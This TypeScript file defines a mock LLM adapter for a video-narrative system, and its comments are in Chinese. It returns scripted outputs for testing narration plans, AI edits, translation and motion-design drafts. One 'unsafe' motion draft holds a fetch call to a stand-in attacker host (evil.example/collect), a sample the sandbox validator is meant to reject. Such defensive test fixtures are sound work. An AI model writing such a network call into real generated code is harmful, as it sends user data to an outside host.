import type { LlmAdapter, LlmCompletion, NarrativeGenerationRequest } from '@ancs/contracts';

/**
 * Mock LLM 适配器（P04-03 / §52；同 P03-07 的 Mock Provider 范式）。
 *
 * 用途：在**无真实 LLM 凭据**时确定性重现生成与故障场景：
 *   valid（合法 JSON）/ fenced（代码围栏包裹）/ repairable（可有限修复：未知字段、字符串数字、缺可选字段）/
 *   invalid_then_valid（首次不可修复 → 重试一次成功，验证"有限修复 + 有限重试"）/
 *   unrepairable（结构性缺失，必须明确失败）/ verbatim（旁白逐字抄原文，触发口语化门控）/
 *   timeout|error（上游失败）。
 *
 * 输出为**结构化 JSON 字符串**（真实 LLM 也应按 §52 返回结构化输出）；内容由输入确定性派生，
 * 因此测试可断言（如"旁白必须引用事实 id""锁定旁白逐字保留"）。
 */

export const MOCK_LLM_MODES = [
  'valid',
  'fenced',
  'repairable',
  'invalid_then_valid',
  'unrepairable',
  'verbatim',
  'timeout',
  'error',
  // P05-06 AI Edit（completePrompt）：合法计划 / 引用不存在场景 / 修改锁定场景 / 不可解析后重试行
  'ai_edit_valid',
  'ai_edit_bad_scene',
  'ai_edit_locked',
  'ai_edit_invalid_then_valid',
  // P07-02 Motion 设计（completePrompt，purpose='motion_design'）：合法 / 危险词法 / 类型错误 / 未注册
  'motion_valid',
  'motion_unsafe',
  'motion_type_error',
  'motion_unregistered',
  // P12-04 多语言翻译（completePrompt，purpose='translation'）：合法（词典应用）/ 数字丢失（触发 fail-closed）
  'translation_valid',
  'translation_numbers_dropped',
  // P12-05 Podcast（narrative complete）：偶数块含视觉指涉句（验证纯音频改写移除+披露）
  'visual_refs',
] as const;
export type MockLlmMode = (typeof MOCK_LLM_MODES)[number];

export interface MockLlmOptions {
  providerId?: string;
  modelVersion?: string;
  /** 默认模式（未排队时使用） */
  defaultMode?: MockLlmMode;
  /** 每段旁白的目标字数（默认按 220 字/分钟估算目标时长） */
  charsPerMinute?: number;
}

/**
 * Motion 设计草稿（P07-02 沙箱契约：纯 JS 脚本 + registerMotion + 注入全局；无 import/JSX）。
 * 四种变体覆盖四道门禁的接受/拒绝路径（与 validator 的阶段映射一一对应）。
 */
export const MOTION_DRAFT_CODE = {
  /** 合法：基于帧的确定性动画（帧间输出不同 → 抽帧哈希各异） */
  valid: `function MockMotion(props) {
  var frame = useCurrentFrame();
  var config = useVideoConfig();
  var progress = interpolate(frame, [0, config.durationInFrames - 1], [0, 1], { extrapolateLeft: 'clamp', extrapolateRight: 'clamp' });
  return React.createElement(
    AbsoluteFill,
    { style: { backgroundColor: '#0B1220', justifyContent: 'center', alignItems: 'center', flexDirection: 'column', gap: 20 } },
    React.createElement('div', { style: { color: '#F5F8FF', fontSize: 84, fontWeight: 700 } }, String(props.headline || 'Custom Motion')),
    React.createElement('div', { style: { height: 10, width: 360 * progress, backgroundColor: '#4F8CFF', borderRadius: 5 } })
  );
}
registerMotion({ name: 'MockMotion', component: MockMotion });`,
  /** 危险词法（静态分析拒绝：网络） */
  unsafe: `function MockMotion() {
  fetch('https://evil.example/collect');
  return React.createElement('div', null, 'x');
}
registerMotion({ name: 'MockMotion', component: MockMotion });`,
  /** 类型错误（arity 不符 → TYPE_CHECK 拒绝） */
  type_error: `function MockMotion() {
  var frame = useCurrentFrame(1, 2, 3);
  return React.createElement('div', null, String(frame));
}
registerMotion({ name: 'MockMotion', component: MockMotion });`,
  /** 未注册（评估拒绝） */
  unregistered: `function MockMotion() {
  return React.createElement('div', null, 'no registration');
}`,
} as const;

const motionDraftFor = (mode: 'motion_valid' | 'motion_unsafe' | 'motion_type_error' | 'motion_unregistered'): Record<string, unknown> => {
  const code =
    mode === 'motion_unsafe'
      ? MOTION_DRAFT_CODE.unsafe
      : mode === 'motion_type_error'
        ? MOTION_DRAFT_CODE.type_error
        : mode === 'motion_unregistered'
          ? MOTION_DRAFT_CODE.unregistered
          : MOTION_DRAFT_CODE.valid;
  return {
    name: 'MockMotion',
    description: mode === 'motion_valid' ? 'Mock 生成的确定性动效（进度条 + 标题）' : 'Mock 变体（用于门禁拒绝路径）',
    code,
    dependencies: [],
  };
};

interface PlanShape {
  title: string;
  thesis: string;
  hook: string;
  chapters: { title: string; intent: string; narrationBlockIds: string[] }[];
  narrationBlocks: { id: string; text: string; chapterTitle: string; claimIds: string[] }[];
  keyClaims: string[];
  ending: string;
}

export class MockLlmAdapter implements LlmAdapter {
  readonly providerId: string;
  /** 可观测：调用次数与最后一次请求（断言重试次数/提示词内容） */
  callCount = 0;
  lastRequest: NarrativeGenerationRequest | null = null;
  lastSystemPrompt: string | null = null;
  private readonly modes: MockLlmMode[] = [];
  private readonly options: Required<Omit<MockLlmOptions, 'providerId'>> & { providerId: string };

  constructor(options: MockLlmOptions = {}) {
    this.providerId = options.providerId ?? 'mock.llm';
    this.options = {
      providerId: this.providerId,
      modelVersion: options.modelVersion ?? 'mock-llm-2026-10',
      defaultMode: options.defaultMode ?? 'valid',
      charsPerMinute: options.charsPerMinute ?? 220,
    };
  }

  scriptNext(mode: MockLlmMode): this {
    this.modes.push(mode);
    return this;
  }

  /**
   * 结构化补全（P05-06 AI Edit）：从 userPrompt 的场景清单中确定性派生编辑计划。
   * 场景清单行格式：`- id=scn_x position=0 type=LINE_CHART duration=6000ms locked=false narration="…"`
   */
  async completePrompt(input: { purpose: string; systemPrompt: string; userPrompt: string }): Promise<LlmCompletion> {
    this.callCount += 1;
    this.lastSystemPrompt = input.systemPrompt;
    const mode = this.modes.shift() ?? this.options.defaultMode;
    const promptVersion = /promptVersion:\s*(\S+)/.exec(input.systemPrompt)?.[1] ?? 'ai-edit-v1';
    if (mode === 'timeout') throw new Error('Mock LLM：上游超时（模拟）');
    if (mode === 'error') throw new Error('Mock LLM：上游 500（模拟）');

    // P07-02 Motion 设计：purpose 感知（mode='valid' 且 purpose='motion_design' → 合法 Motion 草稿）
    const motionMode =
      mode === 'motion_valid' || mode === 'motion_unsafe' || mode === 'motion_type_error' || mode === 'motion_unregistered'
        ? mode
        : input.purpose === 'motion_design' && mode === 'valid'
          ? 'motion_valid'
          : null;
    if (motionMode !== null) {
      return {
        content: JSON.stringify(motionDraftFor(motionMode)),
        modelVersion: this.options.modelVersion,
        promptVersion,
        usage: {},
      };
    }
    if (mode === 'unrepairable') {
      return { content: JSON.stringify({ rationale: [] }), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }

    // P12-04 多语言翻译（purpose='translation'）：确定性 Mock 翻译——
    // 应用词典（systemPrompt 行 `src=>tgt`）逐词替换；数字逐字保留。
    // mode='translation_numbers_dropped' → 首块译文抹掉数字（验证服务端数字一致性 fail-closed）。
    // **Mock 输出 ≠ 真实翻译**：真实翻译 Provider BLOCKED 凭据（同 P06-02 纪律，不冒充）。
    if (input.purpose === 'translation' || mode === 'translation_valid' || mode === 'translation_numbers_dropped') {
      const dictionary = [...input.systemPrompt.matchAll(/([^\n=>]+)=>([^\n]+)/g)].map((match) => ({
        source: match[1]?.trim() ?? '',
        target: match[2]?.trim() ?? '',
      }));
      let blocks: { narrationBlockId: string; text: string }[] = [];
      try {
        const parsed: unknown = JSON.parse(input.userPrompt);
        if (typeof parsed === 'object' && parsed !== null && 'blocks' in parsed) {
          const raw = (parsed as { blocks: unknown }).blocks;
          if (Array.isArray(raw)) {
            blocks = raw
              .filter((entry): entry is { narrationBlockId: string; text: string } => typeof entry === 'object' && entry !== null && 'narrationBlockId' in entry && 'text' in entry)
              .map((entry) => ({ narrationBlockId: String(entry.narrationBlockId), text: String(entry.text) }));
          }
        }
      } catch {
        blocks = [];
      }
      const translations = blocks.map((block, index) => {
        let translated = block.text;
        for (const entry of dictionary) {
          if (entry.source === '') continue;
          translated = translated.split(entry.source).join(entry.target);
        }
        if (mode === 'translation_numbers_dropped' && index === 0) {
          translated = translated.replace(/\d+(\.\d+)?/g, '');
        }
        return { narrationBlockId: block.narrationBlockId, text: translated };
      });
      return {
        content: JSON.stringify({ targetLanguage: /targetLanguage:\s*(\S+)/.exec(input.systemPrompt)?.[1] ?? '', translations }),
        modelVersion: this.options.modelVersion,
        promptVersion,
        usage: {},
      };
    }

    if (mode === 'ai_edit_invalid_then_valid') {
      return { content: '这不是 JSON（Mock：首次损坏）', modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }

    const scenes = [...input.userPrompt.matchAll(/- id=(\S+) position=(\d+) type=(\S+) duration=(\d+)ms locked=(true|false)/g)].map((match) => ({
      id: match[1] ?? '',
      position: Number(match[2] ?? '0'),
      type: match[3] ?? '',
      durationMs: Number(match[4] ?? '0'),
      locked: match[5] === 'true',
    }));
    const first = scenes[0];

    if (mode === 'ai_edit_locked') {
      const lockedScene = scenes.find((scene) => scene.locked) ?? first;
      return {
        content: JSON.stringify({
          rationale: ['尝试修改场景（含锁定场景，应被系统剔除）'],
          operations: lockedScene === undefined ? [] : [{ op: 'update_scene', sceneId: lockedScene.id, changes: { durationMs: lockedScene.durationMs + 500 } }],
        }),
        modelVersion: this.options.modelVersion,
        promptVersion,
        usage: {},
      };
    }
    if (mode === 'ai_edit_bad_scene') {
      return {
        content: JSON.stringify({
          rationale: ['引用不存在的场景（应被服务端拒绝）'],
          operations: [{ op: 'delete_scene', sceneId: 'scn_does_not_exist' }],
        }),
        modelVersion: this.options.modelVersion,
        promptVersion,
        usage: {},
      };
    }

    // ai_edit_valid（默认）：把 prompt 里的毫秒数应用到第一个场景；并给非锁定场景各加一个 +200ms 的中性操作
    const deltaMatch = /(\d+)\s*ms/.exec(input.userPrompt);
    const delta = deltaMatch === null ? 500 : Number(deltaMatch[1]);
    const operations = scenes
      .filter((scene) => !scene.locked)
      .slice(0, 2)
      .map((scene, index) => ({
        op: 'update_scene',
        sceneId: scene.id,
        changes: index === 0 ? { durationMs: Math.max(scene.durationMs + delta, 500) } : { narration: '（AI Edit：段落微调）' },
      }));
    return {
      content: JSON.stringify({
        rationale: operations.map(() => '按用户意图微调场景参数（确定性 Mock）'),
        operations,
      }),
      modelVersion: this.options.modelVersion,
      promptVersion,
      usage: {},
    };
  }

  async complete(input: { request: NarrativeGenerationRequest; systemPrompt: string; userPrompt: string }): Promise<LlmCompletion> {
    this.callCount += 1;
    this.lastRequest = input.request;
    this.lastSystemPrompt = input.systemPrompt;
    const mode = this.modes.shift() ?? this.options.defaultMode;
    const promptVersion = /promptVersion:\s*(\S+)/.exec(input.systemPrompt)?.[1] ?? 'narrative-v1';

    if (mode === 'timeout') throw new Error('Mock LLM：上游超时（模拟）');
    if (mode === 'error') throw new Error('Mock LLM：上游 500（模拟）');
    if (mode === 'unrepairable') {
      return { content: JSON.stringify({ title: '只有标题' }), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }

    const plan = this.buildPlan(input.request);
    if (mode === 'visual_refs') {
      // P12-05：偶数块注入视觉指涉句（"如图所示/这一列"）——供纯音频改写的移除+披露路径
      plan.narrationBlocks = plan.narrationBlocks.map((block, index) => ({
        ...block,
        text: index % 2 === 0 ? `如图所示，看这一列：${block.text}` : block.text,
      }));
      return { content: JSON.stringify(plan), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }
    if (mode === 'verbatim') {
      // 全部旁白逐字复制原文（触发 8-gram 重叠门控；§8.2 不得逐字朗读）
      const digestTexts = input.request.contentDigest.map((item) => item.text).filter((text) => text.length >= 12);
      const pool = digestTexts.length > 0 ? digestTexts : ['原文内容缺失时的占位段落（Mock）'];
      plan.narrationBlocks = plan.narrationBlocks.map((block, index) => ({
        ...block,
        text: pool[index % pool.length] ?? '占位',
      }));
      return { content: JSON.stringify(plan), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }
    if (mode === 'fenced') {
      return { content: `\`\`\`json\n${JSON.stringify(plan)}\n\`\`\``, modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }
    if (mode === 'repairable') {
      const repairable = {
        ...plan,
        // 未知字段（应按严格契约剔除并记录修复）
        extraFieldFromModel: 'should-be-dropped',
        // 字符串数字（应被有限修复为数字）
        estimatedDuration: String(Math.round(input.request.targetDurationMs / 1000)),
        // 缺 ending（应由第一章/标题安全派生）
        ending: undefined,
      };
      return { content: JSON.stringify(repairable), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }
    if (mode === 'invalid_then_valid') {
      return { content: '这不是 JSON —— 模型输出损坏（模拟）', modelVersion: this.options.modelVersion, promptVersion, usage: {} };
    }
    return { content: JSON.stringify(plan), modelVersion: this.options.modelVersion, promptVersion, usage: {} };
  }

  /** 确定性"改写"：只提取数字/主题词并重新组句（保证与原文无 ≥8 字重叠）。 */
  private paraphrase(text: string, index: number): string {
    const numbers = [...text.matchAll(/(-?\d+(?:\.\d+)?)\s*(%|％|个百分点|亿|万|倍|美元|元|bp)?/g)]
      .map((match) => `${match[1] ?? ''}${match[2] ?? ''}`)
      .slice(0, 3);
    const leads = ['我们先把镜头拉近', '换个角度看', '值得停下来想一想', '顺着这条线', '把镜头拉远'];
    const lead = leads[index % leads.length] ?? leads[0];
    if (numbers.length > 0) {
      return `${lead}：关键的量级是 ${numbers.join('、')} 这个范围，它决定了后面讨论的方向与力度。`;
    }
    const topic = text.replace(/[，。；：、,.!?！？\s]/g, '').slice(0, 3);
    return `${lead}：围绕「${topic}」这件事，故事还有更多层次值得展开。`;
  }

  /** 由请求确定性派生叙事计划（口语化改写：不复述原文，使用引导语 + 事实引用）。 */
  private buildPlan(request: NarrativeGenerationRequest): PlanShape {
    const factClaims = request.claims.filter((claim) => claim.factuality === 'fact');
    const keyClaims = factClaims.slice(0, 6).map((claim) => claim.claimId);
    const targetSeconds = Math.max(30, Math.round(request.targetDurationMs / 1000));
    const blocksWanted = Math.max(3, Math.min(12, Math.round(targetSeconds / 20)));

    const narrationBlocks: PlanShape['narrationBlocks'] = [];
    // 锁定旁白优先逐字保留（§8.2）
    for (const locked of request.lockedNarrationBlocks) {
      narrationBlocks.push({
        id: locked.id,
        text: locked.text,
        chapterTitle: '保留段落',
        claimIds: [],
      });
    }
    const sources = request.claims.length > 0 ? request.claims : request.contentDigest.map((item) => ({ claimId: '', text: item.text, factuality: 'analysis' as const, locked: false }));
    for (let index = 0; index < blocksWanted; index += 1) {
      const claim = sources[index % Math.max(sources.length, 1)];
      if (claim === undefined) break;
      // 口语化改写（不复制原文 ≥8 字片段——由口语化门控约束，Mock 也遵守）
      const text = this.paraphrase(claim.text, index);
      narrationBlocks.push({
        id: `nrg_${String(index + 1)}`, // 生成块前缀与锁定块（保留原 id）区分，避免逻辑 ID 冲突
        text,
        chapterTitle: index < Math.ceil(blocksWanted / 2) ? '开场与核心事实' : '影响与总结',
        claimIds: claim.claimId === '' ? [] : [claim.claimId],
      });
    }
    const chapterTitles = [...new Set(narrationBlocks.map((block) => block.chapterTitle))];
    return {
      title: `${request.documentTitle}｜视频叙事`,
      thesis: `围绕「${request.documentTitle}」解释发生了什么、为什么重要。`,
      hook: '先抛出一个反常识的事实，让观众愿意看下去。',
      chapters: chapterTitles.map((title, index) => ({
        title,
        intent: index === 0 ? '建立问题与背景' : '给出影响与结尾',
        narrationBlockIds: narrationBlocks.filter((block) => block.chapterTitle === title).map((block) => block.id),
      })),
      narrationBlocks,
      keyClaims,
      ending: '总结核心结论，并提示下一步关注点。',
    };
  }
}
